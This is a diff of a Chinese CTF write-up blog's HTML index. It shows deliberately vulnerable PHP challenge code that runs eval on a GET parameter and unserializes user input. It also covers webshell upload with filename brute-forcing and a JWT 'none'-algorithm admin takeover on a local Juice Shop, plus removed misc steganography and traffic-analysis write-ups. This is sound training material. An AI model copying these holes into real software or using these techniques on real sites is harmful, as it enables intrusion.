class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;开胃小菜，就让我成为签到题叭&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;WAF,启动！&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;被waf啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>先构造好链子：</p>
@@ -200,12 +362,12 @@
 
 
 <h2 id="孤注一掷"><a href="#孤注一掷" class="headerlink" title="孤注一掷"></a>孤注一掷</h2><p>泄露<a target="_blank" rel="noopener" href="http://www.zip发现/">www.zip发现</a> 存在文件上传控制器。如果我们能上传木马，且能访问到，那就可以getshell了。</p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741660915113-88644328-e458-4c1b-b4bc-720910e8d0f9.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741660915113-88644328-e458-4c1b-b4bc-720910e8d0f9.png"></p>
 <p>跟进move方法，看看路径。</p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741660977604-6fc014e4-84db-488b-806b-87aa75845c71.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741660977604-6fc014e4-84db-488b-806b-87aa75845c71.png"></p>
 <p>跟进buildsavename。</p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741661018911-eab394f8-73bb-4d64-93be-534fe391d428.png"></p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741661008565-49652490-38fd-41a8-b171-079c512aaf88.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741661018911-eab394f8-73bb-4d64-93be-534fe391d428.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741661008565-49652490-38fd-41a8-b171-079c512aaf88.png"></p>
 <p>前面的date可以知道，但是后面的需要爆破。</p>
 <p>现在知道了最终的文件名：</p>
 <p>date(‘Ymd’) . DS . md5(microtime(true)).php</p>
@@ -224,7 +386,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/">展开全文 >></a>
+          <a class="article-more-a" href="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/">展开全文 >></a>
         </p>
       
 
@@ -693,7 +855,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull bkimminich/juice-shop</span><br><span class="line">docker run -d -p <span class="number">80</span>:<span class="number">3000</span> bkimminich/juice-shop</span><br></pre></td></tr></table></figure>
 
 <p>如何攻击？思路是，尝试设置 JWT 的加密方式为空，这样我可以自行设计出 JWT 的前两部分，第三部分置为空。然后通过修改账号密码的方式来重置管理员的密码。开始演示。</p>
-<h3 id="1-发现JWT登录"><a href="#1-发现JWT登录" class="headerlink" title="1. 发现JWT登录"></a><font style="color:rgb(79, 79, 79);">1. 发现JWT登录</font></h3><p><font style="color:rgb(77, 77, 77);">注册账户：<a href="mailto:&#49;&#x32;&#x33;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">123@qq.com</a>，123456登录系统，发现存在 JWT。并且注意到</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">与</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">中</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的值是一致的。</font></p>
+<h3 id="1-发现JWT登录"><a href="#1-发现JWT登录" class="headerlink" title="1. 发现JWT登录"></a><font style="color:rgb(79, 79, 79);">1. 发现JWT登录</font></h3><p><font style="color:rgb(77, 77, 77);">注册账户：<a href="mailto:&#x31;&#50;&#x33;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;">123@qq.com</a>，123456登录系统，发现存在 JWT。并且注意到</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">与</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">中</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的值是一致的。</font></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652702210-b872e40b-fd45-4d0b-9e93-092cbd05c9f7.png"></p>
 <h3 id="2-发现网站邮箱格式"><a href="#2-发现网站邮箱格式" class="headerlink" title="2. 发现网站邮箱格式"></a><font style="color:rgb(79, 79, 79);">2. 发现网站邮箱格式</font></h3><p><font style="color:rgb(77, 77, 77);">浏览网页，发现网站使用的邮箱格式：</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;@juice-sh.op&lt;/font&gt;</code></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652746782-3dc2f5aa-3d56-4075-97d1-7b16af8a433d.png"></p>
@@ -1693,336 +1855,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2025/03/31/JWT/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-领航杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/">领航杯</a>
-    </h1>
-  
-
-        
-        <a href="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2025-03-25T07:43:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<p>title: 领航杯</p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="小明的困惑"><a href="#小明的困惑" class="headerlink" title="小明的困惑"></a>小明的困惑</h2><p>拖到随波逐流，自动修改宽高。得到一串字符find_st</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740817569759-1e24cf4d-53bb-48d4-ad5a-040c6a32d9a6.png"></p>
-<p>同时binwalk分离出一个压缩包，里面有flag，不过需要解压码，尝试刚刚的字符串结果错误。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740817626734-eeee6a2b-eb1b-47b5-8418-fff6795ed981.png"></p>
-<p>本想尝试stgehide提取数据的，结果发现该工具不能用于png。此路不通。</p>
-<p>又常规检查，去看lsb，zstge发现不少东西。</p>
-<p>压缩包我们已经提取出来了，不用看。看lsb通道的第一行，那个字符串跟上面的字符似乎是连在一起的（都有个_）</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740817796214-f2de7d16-71c1-4988-a507-2e2cccda1744.png"></p>
-<p>find_steg_information，这拼起来是顺的，那估计就是了。</p>
-<p>成功解压，进入下一关。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740817922095-52b5037b-a05c-4fbc-bc62-536fd627f171.png"></p>
-<p>文本没看出什么。猜测是零宽度字符隐写，于是我们打开赛博厨子，结果没发现有什么痕迹。</p>
-<p>那就找字里行间的规律什么的—发现换行有的是一个CR，有的是两个CR。这就有点说法了，吧这个规律记录下来。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740820369065-f18160e1-1e53-4b74-9942-6c543f5fc795.png"></p>
-<p>最后统计出：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1211112212212221121121111122111112212221112221121211212212211212</span></span><br></pre></td></tr></table></figure>
-
-<p>根据经验，如果某串数据只有两个形态，我们都将其转换成0和1.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0100001101101110010010000011000001101110001110010100101101100101</span></span><br></pre></td></tr></table></figure>
-
-<p>成功解出。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740820616796-66701e83-9e57-4337-b8c9-8721eb95aa52.png"></p>
-<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>第一步先看协议分级:</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740827575226-8fea2096-31af-483b-b69e-b103825502e9.png"></p>
-<p>不难看出“HTTP”中肯定还传输了什么文件“Data”，所以我们直接右键选中“HTTP”下面的“Data”简单分析一下看看它传输了什么，一般这种就是我们的突破点；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740827945448-7de9e124-97f7-4392-bb38-5a12d5b1377b.png"></p>
-<p>这样一筛选一共也没多少条数据包了，个人比较喜欢按照数据包的大小进行排序来查看，所以这不最大的一个数据包就看见了含有“zip”，这八成是个压缩包，就是不知道里面藏着什么东西，所以我们直接选中右键“追踪流”—“HTPP”即可；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740828006360-0642d877-25b2-4566-bd1e-ef723e5844e9.png">但是我们不从这里导出，因为这个包的数据不完整，即使导出了并且删掉头留下“PK”，那也是打不开的压缩包没有用，那这里我们也懒得找了，既然知道它“HTTP”传了一个压缩包那我们直接选择右上角文件—&gt;导出对象—&gt;HTTP，按照这个步骤来，就可以看见它传输的文件内容；</p>
-<p>文件—&gt;导出对象—&gt;HTTP</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740828030090-108df9b4-4cab-4a05-9ca6-1c835749d48a.png"></p>
-<p>保存完之后，打开方式选择“010”打开并编辑压缩包，因为压缩包的前面还有一些沉余数据，我们选中删除接着“Ctrl+s”保存即可；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740828111065-68532e46-14b1-477b-a7a8-9791dc3879c4.png"></p>
-<p>发现需要密码，然后下意识的就想返回流量包中继续寻找，但是仔细观察压缩包中会发现有两个“pwd”，这很明显是两个密码，所以可能就是这两个密码组合就是这个压缩包密码，但是我们又不能取出来，这时候发现两个“txt文档”的字节是小于18的，所以我们可以使用工具爆破工具，去爆破这两个文件的内容。</p>
-<p>（详情看hashcat工具使用）</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740830717073-7d6bbafc-b21b-4340-b1e9-7e0dc3e1b5cc.webp"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740830766987-74dd0862-a609-4376-919b-74aef8cc789e.webp"></p>
-<p>现在组合一下，挨个尝试即可。</p>
-<p><strong><font style="color:rgb(77, 77, 77);">CRC32_saFe成功解压</font></strong><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740831004145-efc95526-2af7-4e0c-ba7c-920e11f557f7.png"></p>
-<p>那个doxc直接看不出什么，所以我们改成压缩包解压一下。<img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740831060075-41c34ffa-d77f-4452-9ca2-52f28eb96ff0.png"><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740831104999-8e536041-008e-4e22-abb5-a1526a27ffd8.png"></p>
-<h2 id="神奇的压缩"><a href="#神奇的压缩" class="headerlink" title="神奇的压缩"></a>神奇的压缩</h2><p>下载附件得到一个压缩包，解压得到两个文件“readme.txt”及文件“2”。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740875974296-24bac2fa-d690-445d-a275-167ecb019c3f.png"></p>
-<p>发现还是一个压缩包，继续解压：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740876107701-38524ce9-7fdf-465a-a9b5-2d8f957f47b2.png"></p>
-<p>经过不断解压，发现这是在套娃，而且里面压缩格式还不一样。</p>
-<p>这种题一般解压到最后就有flag了。尝试用脚本解压：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>;i&lt;<span class="number">501</span>;++i))  <span class="comment"># 循环从1到500次</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">an=`file <span class="variable">$i</span>`  <span class="comment"># 使用 file 命令检测文件类型，结果保存在变量 an 中</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$an</span>&quot;</span> =~ .*<span class="string">&quot;7-zip&quot;</span>.* ]]; <span class="keyword">then</span>  <span class="comment"># 如果文件类型包含 &quot;7-zip&quot;</span></span><br><span class="line">    7z e <span class="variable">$i</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$i</span>  <span class="comment"># 使用 7z 解压文件，解压后删除原始文件</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$an</span>&quot;</span> =~ .*<span class="string">&quot;bzip2&quot;</span>.* ]]; <span class="keyword">then</span>  <span class="comment"># 如果文件类型包含 &quot;bzip2&quot;</span></span><br><span class="line">    tar xvjf <span class="variable">$i</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$i</span>  <span class="comment"># 使用 tar 解压 bzip2 格式文件，解压后删除原始文件</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$an</span>&quot;</span> =~ .*<span class="string">&quot;gzip&quot;</span>.* ]]; <span class="keyword">then</span>  <span class="comment"># 如果文件类型包含 &quot;gzip&quot;</span></span><br><span class="line">    tar xvzf <span class="variable">$i</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$i</span>  <span class="comment"># 使用 tar 解压 gzip 格式文件，解压后删除原始文件</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$an</span>&quot;</span> =~ .*<span class="string">&quot;XZ&quot;</span>.* ]]; <span class="keyword">then</span>  <span class="comment"># 如果文件类型包含 &quot;XZ&quot;</span></span><br><span class="line">    <span class="built_in">mv</span> <span class="variable">$i</span> <span class="variable">$i</span>.xz; xz -d <span class="variable">$i</span>.xz; tar xvf <span class="variable">$i</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$i</span>  <span class="comment"># 将文件名后缀改为 .xz，解压后删除原始文件</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$an</span>&quot;</span> =~ .*<span class="string">&quot;Zip&quot;</span>.* ]]; <span class="keyword">then</span>  <span class="comment"># 如果文件类型包含 &quot;Zip&quot;</span></span><br><span class="line">    unzip <span class="variable">$i</span> &amp;&amp; <span class="built_in">rm</span> <span class="variable">$i</span>  <span class="comment"># 使用 unzip 解压文件，解压后删除原始文件</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">cat</span> readme.txt &amp;&amp; <span class="built_in">rm</span> readme.txt  <span class="comment"># 输出解压后目录中的 readme.txt 文件内容，并删除 readme.txt</span></span><br><span class="line"><span class="keyword">done</span>  <span class="comment"># 结束循环</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740876296186-673b39f6-e897-46e7-9524-8c7de8421b79.png"></p>
-<h2 id="SecertData"><a href="#SecertData" class="headerlink" title="SecertData"></a>SecertData</h2><p>题目描述：</p>
-<p>从网络中捕获一个可疑数据包，请分析其中隐藏的数据。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740879020656-1a00a0b2-bd3c-42ee-897b-ea6f706adb0f.png"></p>
-<p>纯数据？看看里面是什么：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740879490644-c78f8e3a-3f15-466c-8840-32503c44be06.png"></p>
-<p>发现png文件头被倒过来了。先不急着改，继续往下看看：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740880855988-8f41a542-6c6c-47ec-9007-d14a34d22a9c.png"></p>
-<p>发现文件末尾还有个也被逆序了，这可能就是8位一逆序。</p>
-<p>写个脚本逆过来：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    btext = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(btext)，<span class="number">8</span>):</span><br><span class="line">            data = btext[i:i+<span class="number">8</span>]</span><br><span class="line">            revdata = data[::-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> data[i:i+<span class="number">8</span>] != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                f2.write(revdata)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740881651766-9c19d5c7-a06d-4cc4-9343-baf41b5316d2.png"></p>
-<p>然而flag所在位置被保护了，需要密码才能解开。这时候掏出我们的工具“PasswareKitForensic”专门破解表格密码的工具；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740882084775-0e358c43-4099-4d42-9da7-0ed5c2356fe0.png"><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740882099989-a142f9bb-373f-4524-9bc3-123d09cebe65.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740883333890-26e69871-bfde-4f90-901c-cf4f6f0e9e7b.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740883311124-5de3b493-5269-4dd8-8632-73104b5f8d0b.png"></p>
-<h2 id="我要这key有何用"><a href="#我要这key有何用" class="headerlink" title="我要这key有何用"></a>我要这key有何用</h2><p><strong><font style="color:rgb(77, 77, 77);">题目描述：</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);">光有钥匙可不行，还要有锁啊</font></strong></p>
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<p><font style="color:rgb(77, 77, 77);">打开pdf，直接搜关键字：</font></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740883551279-d1534542-510f-41ae-b65d-cb716b373fcc.png"></p>
-<p>发现key有不少，但是替换这里不能复制，也看不全，所以我们去替换里面。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740883934019-99a637d8-c76e-4ce0-9aed-2c2d859bb8a7.png"></p>
-<p>选中一个直接复制：<img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740884000579-c189d8db-1dc2-414f-9a5a-f57046539525.png"><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740883916088-2823094b-8ee1-4e37-9c27-3c4def5ed3dd.png"></p>
-<p>现在我们得到key了，但是解什么东西呢？这也是题目的描述。</p>
-<p>binwalk提取一下，发现不少东西。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740884105439-3ee8e997-dd12-46c2-adbe-fe61be9cb65f.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740884132090-9385173a-1bc3-4b2d-8fa3-6a56f53c62b9.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740884154572-8a62ed32-5c4e-4387-a6fc-14aec476f69e.png"><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740884191383-83b9a2e8-ff39-428f-b8b1-7fae87420c1b.png"></p>
-<h2 id="黑客流量分析"><a href="#黑客流量分析" class="headerlink" title="黑客流量分析"></a>黑客流量分析</h2><p><strong><font style="color:rgb(77, 77, 77);">题目描述：</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);">服务器网站被入侵了，植入了一个变异的shell，对入侵流量进行分析，寻找蛛丝马迹，变异shell的菜刀连接密码即为flag。</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);"></font></strong></p>
-<p><font style="color:rgb(77, 77, 77);">直接neta提取所有文件，发现一个压缩包，解压后是题目源码,拖到d盾扫一下：</font></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885206376-88c29bb0-4084-4c7f-9c09-5a31f4656b3b.png"></p>
-<p>发现有问题，进去看一下：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885251634-20687e2f-aa2f-4715-b6e4-3040c25dae9e.png"></p>
-<p>这里ctg被赋予了一个值，我们看一下：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885278718-607d73b7-80a1-4210-bd33-25be0768b0c7.png"></p>
-<p>把里面的内容解一下，感觉不太对，后来一看，还有个rot13</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885328250-eaf6ce93-013d-4b3c-96f4-f2d36c12785f.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885364502-452a3e0c-d3e8-4da7-87f6-1844927b11eb.png"></p>
-<h2 id="女儿的秘密"><a href="#女儿的秘密" class="headerlink" title="女儿的秘密"></a><font style="color:rgb(79, 79, 79);">女儿的秘密</font></h2><p><strong><font style="color:rgb(77, 77, 77);">题目描述：</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);">偷偷找到了女儿藏起来的宝贝，看看是啥</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);"></font></strong></p>
-<p><font style="color:rgb(77, 77, 77);">压缩包解压出来后是一堆16进制数据，不晓得怎么办。</font></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885742461-f59f3cd4-fdaa-4058-bbc0-dcd480cec77d.png"></p>
-<p>但是该文件的上一级是re，这可能是提示我们reverse一下。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885774457-9a2e6ab6-4865-4c71-abac-912014ef942e.png"></p>
-<p>发现是个压缩包，我们搞出来。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885824395-f5090655-082d-42a1-97ba-eeac1e4515a4.png"></p>
-<p>结果解压需要密码，没有别的信息，只好爆破一下了。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740885855583-2b93ccea-ebe7-439b-afef-d1fa7d4b7524.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740887827300-f106c5cd-8005-4bf7-a0bb-aba877937c0e.png"></p>
-<p>得到一个照片和一个文档，照片损坏了，我们看一下：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888006445-fd915c31-5530-4afd-9fef-bf76da3b2832.png"></p>
-<p>是个压缩包，解压一下。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888064837-d9eec73a-7889-4e5e-a47b-1c5b28037ac3.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888140359-031e9509-ead0-445c-ac33-48b59be3f4e7.png"></p>
-<p>经过查找，发现一段可疑字符串：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888305474-e71f78e3-ba99-4f53-8240-12e907bfc16a.png"></p>
-<p>得到一段密码，现在还不知道怎么用。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888334233-202c6310-9de8-408f-b372-5c2d83eb393a.png"></p>
-<p>现在只剩下一个secret.txt没有分析了，这段文本是经过加密的，厨子不能直接解开。<img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888463481-e5d2a2f1-8bb9-4a38-9e7e-f3259c633119.png"></p>
-<p>什么加密呢？— 	fermet加密</p>
-<blockquote>
-<p>简单来说Fernet 加密是一种基于对称加密的方案，隶属于 Python cryptography 库中的加密算法。它采用了 AES（高级加密标准）算法进行加密，并使用 HMAC-SHA256 进行消息认证。Fernet 的主要特点是确保加密的数据在传输时既安全又完整。</p>
-<p>Fernet 加密的特点：</p>
-<ol>
-<li>对称加密：加密和解密使用的是同一个密钥。这意味着只有持有该密钥的人才能解密信息。</li>
-<li>自动包含时间戳：Fernet 加密生成的密文中会包含一个加密时的时间戳，用于记录数据何时加密，从而支持加密数据的过期时间验证。</li>
-<li>认证和完整性检查：Fernet 使用 HMAC-SHA256 生成一个消息认证码 (MAC)，确保加密后的数据在传输过程中未被篡改。</li>
-<li>易于使用：Fernet 加密提供了简单的接口，用户只需提供数据和密钥即可轻松实现加密和解密。</li>
-</ol>
-</blockquote>
-<p>怎么分辨出这是“Fernet 加密”的呢？</p>
-<ol>
-<li><strong><font style="color:rgba(0, 0, 0, 0.75);">Base64 编码格式</font></strong></li>
-</ol>
-<ul>
